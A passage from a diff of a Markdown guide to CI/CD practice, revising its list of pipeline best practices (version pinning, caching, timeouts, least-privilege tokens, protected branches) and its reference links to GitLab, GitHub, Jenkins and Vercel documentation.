-- **Cache dependencies, not build output.** Restore `~/.cache/pip` or `node_modules`; rebuilding artifacts from a stale cache produces mysteries.
-- **One job, one responsibility.** Parallelise across jobs and let the platform schedule them.
-- **Make the pipeline runnable locally.** If CI runs `make test`, you can run `make test`. Debugging by pushing commits is the slowest loop in software.
-- **Set a timeout on every job.** The default is generous and a hung job burns minutes until it hits it.
-- **Protect the production branch.** Required reviews, required status checks, no direct pushes — see [Lifecycle → Version Control](../basics/lifecycle.md#version-control).
-- **Keep secrets out of forks and PRs from untrusted sources.**
+- **Fail fast and cheap.** Lint and unit tests first, integration and builds after.
+- **Pin versions.** `actions/checkout@v4`, `python:3.12` — never `latest`. Pin actions by SHA when they touch secrets.
+- **Cache dependencies, not build output.** Restore `~/.cache/pip` or `node_modules`; caching artifacts produces mysteries.
+- **Use a DAG.** `needs` in GitLab and GitHub, `parallel` in Jenkins. Stage barriers waste wall-clock.
+- **Set a timeout on every job.** Defaults are generous — GitHub's is 6 hours.
+- **Cancel superseded runs.** GitHub `concurrency`, GitLab `interruptible`, Jenkins `disableConcurrentBuilds()`.
+- **Serialise deploys.** GitLab `resource_group`, GitHub `environment`, Jenkins `disableConcurrentBuilds()`.
+- **Make it runnable locally.** If CI runs `make test`, you can run `make test`. Debugging by pushing commits is the slowest loop in software.
+- **Protect the production branch** — required reviews and status checks, no direct pushes. See [Lifecycle → Version Control](../basics/lifecycle.md#version-control).
+- **Least privilege on tokens.** GitHub `permissions`, GitLab `CI_JOB_TOKEN` allowlists, Jenkins per-folder credentials.
 - **Make deploys idempotent and reversible.** Re-running should be safe; rolling back should not require a rebuild.
 
 ---
 
 ## References
 
-- **GitLab** — [CI/CD YAML reference](https://docs.gitlab.com/ci/yaml/) · [CI/CD variables](https://docs.gitlab.com/ci/variables/) · [Runner executors](https://docs.gitlab.com/runner/executors/) · [Configure runners](https://docs.gitlab.com/ci/runners/configure_runners/) · [Pipeline security](https://docs.gitlab.com/ci/pipeline_security/)
-- **GitHub** — [Workflow syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions) · [GitHub-hosted runners](https://docs.github.com/en/actions/reference/runners/github-hosted-runners) · [Secrets](https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions) · [Security hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
-- **Jenkins** — [Pipeline syntax](https://www.jenkins.io/doc/book/pipeline/syntax/) · [Using a Jenkinsfile](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/) · [Using credentials](https://www.jenkins.io/doc/book/using/using-credentials/) · [Docker with Pipeline](https://www.jenkins.io/doc/book/pipeline/docker/) · [Kubernetes plugin](https://plugins.jenkins.io/kubernetes/)
-- **Vercel** — [How Vercel builds your application](https://vercel.com/docs/fundamentals/builds) · [Git deployments](https://vercel.com/docs/git) · [Environment variables](https://vercel.com/docs/environment-variables) · [Project configuration](https://vercel.com/docs/project-configuration) · [Managing builds](https://vercel.com/docs/builds/managing-builds)
-- **General** — [Continuous Delivery](https://continuousdelivery.com/) (Humble & Farley) · [The Twelve-Factor App](https://12factor.net/) on config in the environment · [OpenSSF: securing CI/CD](https://openssf.org/)
+- **GitLab** — [YAML reference](https://docs.gitlab.com/ci/yaml/) · [predefined variables](https://docs.gitlab.com/ci/variables/predefined_variables/) · [CI/CD variables](https://docs.gitlab.com/ci/variables/) · [components](https://docs.gitlab.com/ci/components/) · [runner executors](https://docs.gitlab.com/runner/executors/) · [configure runners](https://docs.gitlab.com/ci/runners/configure_runners/) · [pipeline security](https://docs.gitlab.com/ci/pipeline_security/)
+- **GitHub** — [workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax) · [hosted runners](https://docs.github.com/en/actions/reference/runners/github-hosted-runners) · [using secrets](https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions) · [security hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
+- **Jenkins** — [pipeline syntax](https://www.jenkins.io/doc/book/pipeline/syntax/) · [using a Jenkinsfile](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/) · [credentials](https://www.jenkins.io/doc/book/using/using-credentials/) · [Docker with Pipeline](https://www.jenkins.io/doc/book/pipeline/docker/) · [Kubernetes plugin](https://plugins.jenkins.io/kubernetes/)
+- **Vercel** — [project configuration](https://vercel.com/docs/project-configuration) · [how Vercel builds](https://vercel.com/docs/fundamentals/builds) · [git deployments](https://vercel.com/docs/git) · [environment variables](https://vercel.com/docs/environment-variables) · [managing builds](https://vercel.com/docs/builds/managing-builds)
+- **General** — [Continuous Delivery](https://continuousdelivery.com/) (Humble & Farley) · [The Twelve-Factor App](https://12factor.net/) on config in the environment · [OpenSSF](https://openssf.org/)
